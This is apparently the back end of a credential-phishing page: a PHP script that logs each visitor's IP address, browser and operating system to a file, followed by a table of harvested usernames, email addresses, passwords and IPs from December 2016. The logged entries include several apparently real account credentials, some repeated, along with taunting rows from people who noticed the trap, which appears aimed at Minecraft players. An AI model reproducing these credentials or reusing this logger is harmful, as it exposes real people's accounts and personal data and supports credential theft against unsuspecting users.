<?php

$ip = $_SERVER['REMOTE_ADDR'];

$date = date("Y/m/d/ h:i:s");

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {

global $user_agent;

$os_platform    =   "Unknown OS Platform";

$os_array       =   array(
                        '/windows nt 6.2/i'     =>  'Windows 8',
                        '/windows nt 6.1/i'     =>  'Windows 7',
                        '/windows nt 6.0/i'     =>  'Windows Vista',
                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                        '/windows nt 5.1/i'     =>  'Windows XP',
                        '/windows xp/i'         =>  'Windows XP',
                        '/windows nt 5.0/i'     =>  'Windows 2000',
                        '/windows me/i'         =>  'Windows ME',
                        '/win98/i'              =>  'Windows 98',
                        '/win95/i'              =>  'Windows 95',
                        '/win16/i'              =>  'Windows 3.11',
                        '/macintosh|mac os x/i' =>  'Mac OS X',
                        '/mac_powerpc/i'        =>  'Mac OS 9',
                        '/linux/i'              =>  'Linux',
                        '/ubuntu/i'             =>  'Ubuntu',
                        '/iphone/i'             =>  'iPhone',
                        '/ipod/i'               =>  'iPod',
                        '/ipad/i'               =>  'iPad',
                        '/android/i'            =>  'Android',
                        '/blackberry/i'         =>  'BlackBerry',
                        '/webos/i'              =>  'Mobile'
                     );

foreach ($os_array as $regex => $value) {

 if (preg_match($regex, $user_agent)) {
    $os_platform    =   $value;
 }

}

return $os_platform;

}

function getBrowser() {

global $user_agent;

$browser        =   "Unknown Browser";

$browser_array  =   array(
                         '/msie/i'       =>  'Internet Explorer',
                         '/firefox/i'    =>  'Firefox',
                         '/safari/i'     =>  'Safari',
                         '/chrome/i'     =>  'Chrome',
                         '/opera/i'      =>  'Opera',
                         '/netscape/i'   =>  'Netscape',
                         '/maxthon/i'    =>  'Maxthon',
                         '/konqueror/i'  =>  'Konqueror',
                         '/mobile/i'     =>  'Handheld Browser'
                   );

foreach ($browser_array as $regex => $value) {

  if (preg_match($regex, $user_agent)) {
     $browser    =   $value;
  }

}

return $browser;

}

$user_os        =   getOS();
$user_browser   =   getBrowser();
	
	$html= '<tr><th scope="row">#</th><td>'. $ip .'</td><td>'. $date .'</td><td>'. $user_browser .'</td><td>'. $user_os .'</td><td>/log.php</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>'. PHP_EOL;
	file_put_contents('iplog.php', $html, FILE_APPEND); ?>
	
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<table class="table table-hover text text-danger">
    <thead class="table-hover">
        <tr>
            <th>#</th>
            <th>Username:</th>
            <th>Password:</th>
			<th>IP Address:</th>
			<th>Time:</th>
        </tr>
    </thead>
    <tbody class="table table-hover">

<tr><th scope="row">#</th><td>sadsa</td><td>asdsad</td><td>31.209.198.80</td><td>2016/12/19/ 02:10:00</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>isnonsd@gmail.com</td><td>saumadrengur</td><td>31.209.212.122</td><td>2016/12/19/ 03:30:15</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>afaff@gmail.com</td><td>Drengilegur</td><td>31.209.212.122</td><td>2016/12/19/ 03:30:35</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>djshea1552@gmail.com</td><td>Psalms23!</td><td>72.42.145.179</td><td>2016/12/19/ 08:30:07</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>Liamtheblueninja</td><td>Psalms23!</td><td>72.42.145.179</td><td>2016/12/19/ 08:30:53</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>Liamtheblueninja</td><td>Psalms23!</td><td>72.42.145.179</td><td>2016/12/19/ 08:31:25</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>djshea1552@gmail.com</td><td>Psalms23!</td><td>72.42.145.179</td><td>2016/12/19/ 08:32:44</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>Liamtheblueninja</td><td>Psalms23!</td><td>72.42.145.179</td><td>2016/12/19/ 08:33:25</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>Bethjaneane@gmail.com</td><td>Baxter62306</td><td>108.253.194.53</td><td>2016/12/19/ 09:18:04</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>WimpTest</td><td>Baxter62306</td><td>108.253.194.53</td><td>2016/12/19/ 09:18:34</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>bethjaneane@gmail.com</td><td>Baxter62306</td><td>108.253.194.53</td><td>2016/12/19/ 09:19:48</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>WimpTest</td><td>Baxter62306</td><td>108.253.194.53</td><td>2016/12/19/ 09:20:11</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>s_gems1@hotmail.com</td><td>nov2906*</td><td>98.167.77.131</td><td>2016/12/19/ 10:30:50</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>9090fighter</td><td>nov2906*</td><td>98.167.77.131</td><td>2016/12/19/ 10:31:04</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>mcsurvivalehf.info@gmail.com</td><td>77afj22h</td><td>153.92.129.148</td><td>2016/12/20/ 09:01:42</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>mcsurvivalehf.info@gmail.com</td><td>77afj222</td><td>153.92.129.148</td><td>2016/12/20/ 09:02:01</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>ifuckpigs</td><td>æeg elska muttu</td><td>213.220.64.231</td><td>2016/12/20/ 03:44:02</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>elfarbjarki@gmail.com</td><td>Marmarasandkaka1</td><td>194.144.28.183</td><td>2016/12/22/ 05:47:02</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>elfarbjarki@gmail.com</td><td>Marmarasandkaka1</td><td>194.144.28.183</td><td>2016/12/22/ 05:47:33</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>jonadalsteinndavidsson@gmail.com</td><td>Goggimega1</td><td>194.144.28.183</td><td>2016/12/22/ 05:49:12</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>jonadalsteinndavidsson@gmail.com</td><td>Goggimega1</td><td>194.144.28.183</td><td>2016/12/22/ 05:49:40</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>Jonadalsteinndavidsson@gmail.com</td><td>Goggimega1</td><td>194.144.28.183</td><td>2016/12/22/ 05:50:03</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>click</td><td>baited</td><td>153.92.129.148</td><td>2016/12/24/ 02:57:06</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
<tr><th scope="row">#</th><td>gg 4 life                      its like kwikskoop lmao gggg ezzzzzz gurr takk fyrir mineshkraft countid og lika fyrir free optifine cape</td><td>America.... FUCKE YEHA IM LIKE GG FUKCKEN G :D</td><td>153.92.129.148</td><td>2016/12/24/ 02:58:48</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>
